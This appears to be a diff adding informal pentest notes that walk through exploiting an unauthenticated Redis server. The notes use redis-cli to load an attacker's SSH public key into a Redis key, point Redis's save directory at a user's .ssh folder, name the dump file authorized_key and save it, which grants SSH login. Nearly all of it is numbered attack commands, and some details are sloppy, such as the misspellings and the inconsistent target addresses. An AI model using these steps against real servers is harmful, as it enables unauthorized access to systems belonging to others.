@@ -1,2 +1,39 @@
 use tool 
       ==> radis-cli
+
+https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
+
+
+
+1 ==>  for dir                        config get dir
+2 ==>  for cd                         config set dir
+
+set dir to the .ssh folder, and copy ssh key(.pub) to authorized_key
+for that find out the /.ssh dir      probable   /home/<uname>/.ssh
+set dir to that dir by ==>
+
+3 ==> config set dir <*> / <*> /<uname>/.ssh
+
+in own machine create ssh keys and move key.pub to temp.txt with 2 blank in start and last
+
+4 ==> $ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
+
+now transfer this to redis's memory buffer , like a variable, there we take s-key
+
+5 ==>  $ cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key
+
+now login to redis b redis-cli (again)
+
+6 ==> $ redis-cli -h 10.10.10.10
+
+verify the s-key content
+
+7 ==>  redis-cli> get s-key
+8 ==>  redis-cli > config set dir */*/.ssh
+9 ==>  redis-cli > config set dbfilename authorized_key
+verify
+10 ==>  redis-cli > config get dbfilename
+save it
+11 ==>  redis-cli > save
+         
+         now login with ssh
